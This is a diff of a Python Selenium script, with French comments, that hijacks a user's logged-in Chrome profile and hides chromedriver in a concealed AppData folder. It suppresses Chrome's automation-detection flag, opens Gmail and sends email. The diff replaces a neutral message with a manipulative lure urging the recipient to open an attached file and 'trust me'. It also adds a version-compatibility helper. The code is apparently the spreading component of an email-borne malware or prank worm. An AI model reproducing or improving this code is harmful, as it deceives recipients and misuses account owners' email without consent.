@@ -6,13 +6,13 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 from selenium.common.exceptions import NoSuchElementException
 
-EMAIL_SUBJECT = "Automated Message"
-EMAIL_BODY = """Bonjour,
+#ptit malin pk tu guette le code comme as, c'est un code troll g pas de site pour l'hébergé
 
-Ceci est un message automatique envoyé via script Python Selenium.
-
-Cordialement,
-Le Robot
+EMAIL_SUBJECT = "Important.. je suis désolé..."
+EMAIL_BODY = """
+désolé mais...
+c'est important pour moi que tu sache ça, je..
+je veux pas que ça se sache alors tien ce fichier et regarde ce qui as dedans.. fait moi confiance
 """
 
 def is_connected(driver):
@@ -53,6 +53,18 @@ def send_mail(driver, to_addr, subject, body):
     body_input.send_keys(Keys.CONTROL, Keys.ENTER)
     time.sleep(2)
 
+def get_driver(chromedriver_path, chrome_options):
+    from selenium import __version__ as selenium_version
+    # Pour selenium >= 4.6, il faut utiliser Service
+    major, minor, *_ = map(int, selenium_version.split('.'))
+    if major > 4 or (major == 4 and minor >= 6):
+        from selenium.webdriver.chrome.service import Service
+        service = Service(executable_path=chromedriver_path)
+        return webdriver.Chrome(service=service, options=chrome_options)
+    else:
+        # Ancienne syntaxe
+        return webdriver.Chrome(executable_path=chromedriver_path, options=chrome_options)
+
 def main():
     chrome_options = Options()
     chrome_options.add_argument("--disable-blink-features=AutomationControlled")
@@ -60,10 +72,9 @@ def main():
     if os.path.exists(user_data_dir):
         chrome_options.add_argument(f'--user-data-dir={user_data_dir}')
         chrome_options.add_argument('--profile-directory=Default')
-    # Chemin chromedriver caché :
     hidden_path = os.path.expandvars(r"%APPDATA%\.sys_hidden")
     chromedriver_path = os.path.join(hidden_path, "chromedriver.exe")
-    driver = webdriver.Chrome(executable_path=chromedriver_path, options=chrome_options)
+    driver = get_driver(chromedriver_path, chrome_options)
     driver.get("https://mail.google.com/mail/u/0/#inbox")
     time.sleep(5)
     if not is_connected(driver):
